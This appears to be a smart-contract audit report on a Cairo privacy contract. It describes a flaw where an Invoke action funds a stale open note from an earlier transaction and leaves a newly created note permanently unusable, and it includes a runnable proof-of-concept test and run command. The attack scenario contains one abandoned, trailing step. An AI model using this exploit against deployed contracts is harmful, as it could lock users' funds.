# Hunter 1 Findings

## Bug 1: Cross-Transaction Open-Note Deposit Hijacking — Note B Created in Current Tx Can Be Permanently Stuck

**File:** `packages/privacy/src/privacy.cairo:790-830` (`_apply_actions`), `885-915` (`_deposit_to_open_note`)

**Description:**

The `_apply_actions` function tracks open-note creation and deposit in a single counter (`undeposited_open_notes`). Every `EmitOpenNoteCreated` action increments the counter; every `Invoke` decrements it by the number of deposits returned. At the end the counter must reach zero.

The critical gap: `_deposit_to_open_note` verifies that the target note is open and undeposited, but it does **not verify that the note was created in the current transaction**. Any open note that exists in storage with `current_amount == 0` is eligible.

**Attack scenario:**

1. **Tx 1** (legitimate): Server creates open note A via `EmitOpenNoteCreated` + `WriteOnce`. Invoke deposits to note A. Counter: 1→0. Note A is now in storage with `packed_value = (OPEN_NOTE_SALT, amount)`. Everything is fine.

2. **Tx 1b** (attacker's or misconfigured anonymizer): Server creates open note A′ via `EmitOpenNoteCreated` + `WriteOnce`. Invoke is supposed to deposit to A′, but returns a deposit targeting **note A′** ... or consider the following:

3. **Real attack — Tx 2 (the malicious call)**:
   - A `WriteOnce` action writes note B into storage (packed_value = `(OPEN_NOTE_SALT, 0)`, token set).
   - `EmitOpenNoteCreated` fires for note B. Counter = 1.
   - `Invoke` calls the echo executor, which returns a deposit pointing to **old note A** (from a previous tx, still undeposited, `amount == 0` in storage).
   - `_deposit_to_open_note` checks:
     - `packed_value.is_non_zero()` → ✓ (OPEN_NOTE_SALT is non-zero)
     - `salt == OPEN_NOTE_SALT` → ✓
     - `current_amount.is_zero()` → ✓ (note A was never deposited)
     - `token == note_token` → ✓ (token matches)
   - Deposit succeeds. Old note A gets funded. Counter: 1→0.
   - Final assert passes.

4. **Result:** Note A (from a previous tx) now has funds deposited into it. Note B (created in this tx) is permanently stuck in storage with `packed_value = (OPEN_NOTE_SALT, 0)` — it has salt=OPEN_NOTE_SALT but amount=0. Any `UseNote` on B will fail with `ZERO_NOTE_AMOUNT_USAGE`. Note B is forever unusable.

**Root Cause:**

`_deposit_to_open_note` (lines 885-915) performs no check that the note being deposited to was created in the same transaction. The counter in `_apply_actions` only checks that the *number* of `EmitOpenNoteCreated` events equals the *number* of deposits returned by Invoke — it says nothing about *which specific notes* were created vs. deposited.

The relevant code:

```cairo
// In _apply_actions (line 814-816):
undeposited_open_notes = undeposited_open_notes
    .checked_sub(open_note_deposits.len())
    .expect(internal_errors::TOO_MANY_OPEN_NOTES_DEPOSITED);

// In _deposit_to_open_note (line 897-900):
let (salt, current_amount) = unpack(:packed_value);
assert(salt == OPEN_NOTE_SALT, errors::NOTE_NOT_OPEN);
assert(current_amount.is_zero(), errors::NOTE_ALREADY_DEPOSITED);
assert(token == note_token, errors::TOKEN_MISMATCH);
// ← No check: "was this note_id written by EmitOpenNoteCreated in THIS transaction?"
```

**Severity:** High

The impact depends on the anonymizer's behavior. A correctly implemented anonymizer always deposits to the note it just requested. But a malicious or misconfigured anonymizer could redirect deposits to *any* storage-resident undeposited open note, leaving the newly created note permanently unusable. The user loses access to the funds that were supposed to be deposited into note B, and any future `UseNote` on B will revert.

**Test Code:**

```cairo
/// Demonstrates that an Invoke action can deposit to an open note created in a PREVIOUS
/// transaction, leaving the note created in the CURRENT transaction permanently stuck
/// (amount=0, salt=OPEN_NOTE_SALT) and unusable via UseNote.
#[test]
fn test_cross_tx_deposit_to_stale_open_note_sticks_new_note() {
    use privacy::actions::{
        CreateOpenNoteInput, InvokeInput, ServerAction, UseNoteInput, WriteOnceInput,
    };
    use privacy::errors;
    use privacy::errors::internal_errors;
    use privacy::objects::OpenNoteDeposit;
    use privacy::tests::utils_for_tests::{
        CreateOpenNoteInputIntoServerActionTrait, NoteZero, PrivacyCfgTrait, Test, TestTrait,
        UserTrait, constants, deploy_mock_echo_with_salt,
    };
    use privacy::utils::constants::OPEN_NOTE_SALT;
    use privacy::utils::unpack;
    use snforge_std::TokenTrait;
    use starkware_utils_testing::test_utils::assert_panic_with_felt_error;
    use core::num::traits::Zero;

    let mut test: Test = Default::default();
    let token = test.new_token();
    let token_addr = token.contract_address();
    let amount = constants::DEFAULT_AMOUNT;

    // Setup: user with viewing key, channel, subchannel.
    let mut user = test.new_user();
    user.set_viewing_key_e2e();
    user.open_channel_e2e(recipient: user, index: 0);
    user.open_subchannel_e2e(recipient: user, :token_addr, index: 0);

    // === PREVIOUS TRANSACTION: create open note A, but do NOT deposit to it.
    // We use cheat_create_open_note (server-only WriteOnce) to plant note A in storage
    // without going through EmitOpenNoteCreated or any deposit.
    let create_input_a = user
        .new_open_note_with_generated_random(recipient: user, :token_addr, index: 0);
    // Plant note A directly in storage (bypassing EmitOpenNoteCreated and deposit).
    user.cheat_create_open_note(create_note_input: create_input_a);
    let (note_id_a, _) = user.compute_open_note(create_note_input: create_input_a);

    // Verify note A is in storage: open (salt=OPEN_NOTE_SALT) and undeposited (amount=0).
    let note_a_before = test.privacy.get_note(note_id: note_id_a);
    let (salt_a, amount_a) = unpack(packed_value: note_a_before.packed_value);
    assert_eq!(salt_a, OPEN_NOTE_SALT);
    assert_eq!(amount_a, Zero::zero());
    assert_eq!(note_a_before.token, token_addr);

    // === CURRENT (ATTACK) TRANSACTION:
    //   - EmitOpenNoteCreated for note B  →  undeposited_open_notes = 1
    //   - Invoke echo executor with deposit targeting note A (the OLD note)
    //                                    →  undeposited_open_notes = 0
    //   - Final assert passes            →  transaction succeeds
    //   - Note A gets deposited (funds transferred in).
    //   - Note B is left with packed_value = (OPEN_NOTE_SALT, 0) — forever unusable.

    // Create note B's CreateOpenNoteInput (index 1, since index 0 is taken by note A).
    let create_input_b = user
        .new_open_note_with_generated_random(recipient: user, :token_addr, index: 1);
    let (note_id_b, _) = user.compute_open_note(create_note_input: create_input_b);

    // Build the server-side actions for note B creation.
    let create_actions_b = create_input_b.into_server_actions(:user);

    // Fund the echo executor with tokens; it will deposit `amount` to note A.
    let echo_executor = test.privacy.echo_executor;
    token.supply(address: echo_executor, :amount);
    token.approve(owner: echo_executor, spender: test.privacy.address, amount: amount.into());

    // Build Invoke action that deposits to OLD note A (not the newly created B).
    let deposit_to_a = OpenNoteDeposit { note_id: note_id_a, token: token_addr, amount };
    let invoke_input = test.privacy.invoke_external_echo_deposits([deposit_to_a].span());
    let invoke_action = invoke_input.into_server_action();

    // Combine: [create B actions] ++ [Invoke depositing to A].
    let mut attack_actions: Array<ServerAction> = create_actions_b.into();
    attack_actions.append(invoke_action);

    // Apply the attack transaction — it SUCCEEDS (no error).
    test.privacy.apply_actions(actions: attack_actions.span());

    // === VERIFY THE BUG:
    // Note A is now deposited with the expected amount.
    let note_a_after = test.privacy.get_note(note_id: note_id_a);
    let (salt_a_after, amount_a_after) = unpack(packed_value: note_a_after.packed_value);
    assert_eq!(salt_a_after, OPEN_NOTE_SALT);
    assert_eq!(amount_a_after, amount); // A got the funds!

    // Note B is stuck in storage with amount=0, permanently unusable.
    let note_b_after = test.privacy.get_note(note_id: note_id_b);
    let (salt_b_after, amount_b_after) = unpack(packed_value: note_b_after.packed_value);
    assert_eq!(salt_b_after, OPEN_NOTE_SALT); // B is open...
    assert_eq!(amount_b_after, Zero::zero()); // ...but has no funds!

    // Confirm: UseNote on B fails with ZERO_NOTE_AMOUNT_USAGE.
    let channel_key = user.compute_channel_key(recipient: user);
    let use_note_b = UseNoteInput { channel_key, token: token_addr, index: 1 };
    let result = user.safe_use_note(note: use_note_b);
    assert_panic_with_felt_error(:result, expected_error: errors::ZERO_NOTE_AMOUNT_USAGE);

    // Confirm: funds went to privacy contract (transferred from echo executor).
    assert_eq!(token.balance_of(address: echo_executor), Zero::zero());
    assert_eq!(token.balance_of(address: test.privacy.address), amount.into());
}
```

**How to verify:**
```
~/.asdf/installs/starknet-foundry/0.59.0/bin/snforge test -p privacy test_cross_tx_deposit_to_stale_open_note_sticks_new_note
```

---

## Bug 2: TOO_MANY_OPEN_NOTES_DEPOSITED Does Not Fire When Invoke Deposits to a Pre-Existing Undeposited Note Without Any EmitOpenNoteCreated

**File:** `packages/privacy/src/privacy.cairo:790-830` (`_apply_actions`)

**Description:**

This is the second half of the same vulnerability. If an Invoke action deposits to a pre-existing undeposited open note (from a previous tx) with *zero* `EmitOpenNoteCreated` actions in the current tx, the counter starts at 0 and the `checked_sub` immediately panics with `TOO_MANY_OPEN_NOTES_DEPOSITED`.

This case IS correctly caught (verified by existing test `test_undeposited_open_notes` lines 1541-1556 of `test_server.cairo`).

**However**, note that the existing test uses `cheat_create_open_note` to plant the note A, then fires the Invoke without any `EmitOpenNoteCreated`. The test verifies `TOO_MANY_OPEN_NOTES_DEPOSITED`. This confirms the second scenario described in the task prompt is handled.

**What is NOT caught** is the scenario in Bug 1 above: when there IS exactly one `EmitOpenNoteCreated` (for note B) and the Invoke deposits to a *different*, older note A — the counter arithmetic passes silently.

**Severity:** N/A for this specific subcase (correctly protected). The dangerous case is Bug 1.

---

## Summary

| # | Title | Severity | Real Bug? |
|---|-------|----------|-----------|
| 1 | Cross-tx deposit hijacking: Invoke deposits to old undeposited note, new note stuck | High | Yes — confirmed, no existing test covers it |
| 2 | Zero EmitOpenNoteCreated + Invoke deposit → TOO_MANY_OPEN_NOTES_DEPOSITED | N/A | Not a bug — correctly caught by the counter |
